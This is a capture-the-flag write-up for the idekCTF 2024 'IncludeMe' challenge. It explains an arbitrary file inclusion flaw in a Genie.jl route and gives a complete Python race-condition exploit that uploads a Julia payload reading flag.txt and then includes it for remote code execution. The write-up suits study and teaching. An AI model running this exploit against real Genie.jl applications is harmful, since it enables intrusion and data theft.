---
id: 476adce3-c249-4a2d-ad88-ea823a5c99a1
title: Arbitrary File Inclusion Leading to RCE in Genie.jl - IncludeMe [idekCTF 2024]
created_time: 2024-08-19T00:24:00.000Z
last_edited_time: 2024-09-28T00:27:00.000Z
cover_image: ./imgs/images_CYPDSAFZ
icon_emoji: 🏎️
categories: []
verification:
  state: unverified
  verified_by: null
  date: null
page: Arbitrary File Inclusion Leading to RCE in Genie.jl - IncludeMe [idekCTF 2024]
owner:
  - object: user
    id: ee7aeeeb-cd0d-4cbb-9e7e-109320ff16fa
    name: Dimas
    avatar_url: >-
      https://s3-us-west-2.amazonaws.com/public.notion-static.com/fab4bcf0-36ea-4bd6-8847-f18b157387da/92920739.png
    type: person
    person:
      email: dimasmaulana0305@gmail.com
_thumbnail: ./imgs/images_CYPDSAFZ

---

In idekCTF 2024, I played with the **P1G SEKAI** team and secured 1st place out of 1,068 teams! I solved a challenge named "Included me" and got the first blood on that challenge.

# Challenge Description

another minimalist, frontend-less, challenge because i'm bad at writing server-side challenges

[image](https://prod-files-secure.s3.us-west-2.amazonaws.com/39d1be85-e7c6-4263-a666-a42da95a70df/709a0b78-7ae2-4171-930b-e98c753c8621/includeme.tar.gz?X-Amz-Algorithm=AWS4-HMAC-SHA256\&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD\&X-Amz-Credential=ASIAZI2LB466R4LQIECY%2F20250522%2Fus-west-2%2Fs3%2Faws4_request\&X-Amz-Date=20250522T100306Z\&X-Amz-Expires=3600\&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEBoaCXVzLXdlc3QtMiJHMEUCIQCHUMuLNeTTqf31lRpFMC5JHaacCpufLIc1%2FA1jruXKEQIgE5G9pcoeGl%2BsoA11jFCrscfz%2FQVF8oNhkodOycfxHmAqiAQI0%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDJfhe%2FBM%2BYNpdRzT2CrcA%2Bkibiga0j5CqBKQ7v%2FI4BphF1onB%2BFxh6Gixih0yD7kWm8kueUK3%2FRkWN5ZdGQdXUyovQfsbHgbkXOVUCss253kDiTkDyG%2BCa2mFo5ePgS1FrIrdvJmxBf1wEMyD25YKAvDg9lXQorLUzUXZZmtCR%2FJQVA0shOQUdMcV0UvwWkG3Bphz%2F09E5PFhfStRGiNBnxIZ%2B%2Bhisa%2BzdZAnowQ56aMCe%2FIVJAOTGJgVRwkGjLcBvrJV1XJ1NImnQbfBfUQ%2FU432MgDuJ96BWzqMpZbCseHMnYPU7lDTzR7xm2%2BUn2VTozBSFTNDnpCaleQY%2FyK21kIzRvgo1V4Btrmkn8%2BlgNz%2BykAalpeheeySo1gXK10Xb0gUOIcz7cpLRIGZbyxDzFTHoR%2BmZtEwu%2FX%2F%2F4YRfhigtH8IXGLSnJkan8QV9q%2BBt3sYMGaLAZfaAunTz%2B9xkARU82wUldGJCaFQD8%2BuDSYTwTl%2B46CZR36w5PDHhJCTvAzlCT3UWJGJPAvMMdtf77vH4Hn2S%2FmoU1ioSS2fKT06BorZXHNvfl7FK8qZaJ5ky924pAyb4imvrC5y8bLtEO0IGdawtLmgq9raN5MZPZXupg56NncNyXDAWfc9swuw%2Fpgaipgtd3Sj99iMJXdu8EGOqUBHLac6M5YsFKimbhhiImElBlBfeyvPQJ3A3N9%2FqyZDW49jzb6XpnRMex3668EcxZFLso9az3rKDCDWdI9E%2B9TaIJaZ0hCYHl%2B8CimUyI%2BB3JEIY4mnDXACq1mKtU4T61GSYh63FN%2B4eOCIRp7fGEUzdwmJ1BTDsRq%2FsymEvKdaWoYnASQn2WzgbtelyAG1ZldfJoZBKVt7i9NcCMWMQhQf77cxPW8\&X-Amz-Signature=a42feeb2b6c3667d30ba19c13c29be8985690404eca5340ecf992448c645e998\&X-Amz-SignedHeaders=host\&x-id=GetObject)

# How to Solve

The goal of this challenge was to achieve Remote Code Execution (RCE) and capture the flag. The program was vulnerable to arbitrary file inclusion here:

```julia
using Genie, Genie.Requests, Pkg

Pkg.activate(".")

index() = include(params(:page, "example.jl"))

route("/", index)

up(1337, "0.0.0.0", async = false)
```

We could include arbitrary files into the application, altering its flow. I discovered that we could include a test case from this Genie.jl repository:

> [![image](./imgs/b322ed80-bc5a-11e9-807a-9b53749c40ef_ftYlQyUC) **Genie.jl/test/fileuploads/test.jl at 509886d61a75d74bcbd45db1f77230abd4cd11a8 · GenieFramework/Genie.jl**](https://github.com/GenieFramework/Genie.jl/blob/509886d61a75d74bcbd45db1f77230abd4cd11a8/test/fileuploads/test.jl#L14)\
> 🧞The highly productive Julia web framework. Contribute to GenieFramework/Genie.jl development by creating an account on GitHub.\
> <https://github.com/GenieFramework/Genie.jl/blob/509886d61a75d74bcbd45db1f77230abd4cd11a8/test/fileuploads/test.jl#L14>

This test case essentially exposes a file upload vulnerability, allowing us to upload arbitrary files into Genie. However, after including that file, the program’s flow would change, preventing us from doing it a second time… or would it? The solution is yes, we can include it again if we’re fast enough to include `app.jl` right after uploading the file. This requires a race condition. Here's my solution script:

```python
import httpx
import asyncio

URL = "http://localhost:1337"
# URL = "https://includeme-295e03fffda9795f.instancer.idek.team/"

class BaseAPI:
    def __init__(self, url=URL) -> None:
        self.c = httpx.AsyncClient(base_url=url, timeout=100)
    def page(self, page):
        return self.c.get("/", params={"page": page})
    def upload(self, fileupload):
        return self.c.post("/", files={"fileupload": ("x.jl", fileupload)})
class API(BaseAPI):
    ...

async def main():
    api = API()
    ress = []
    res1 = api.page("../home/ctf/.julia/packages/Genie/yQwwj/test/fileuploads/test.jl")
    ress.append(res1)
    for i in range(10):
        res2 = api.upload("""
read(`cat flag.txt`, String)
""")
        for j in range(10):
            res3 = api.page("app.jl")
            ress.append(res3)
        ress.extend([res1, res2])
    ress = await asyncio.gather(*ress)
    for res in ress:
        print(res.text)


if __name__ == "__main__":
    asyncio.run(main())

```

Next, visit <http://localhost:1337/?page=x.jl> to retrieve the flag.

![](./imgs/image_2FRbeU5K.png)
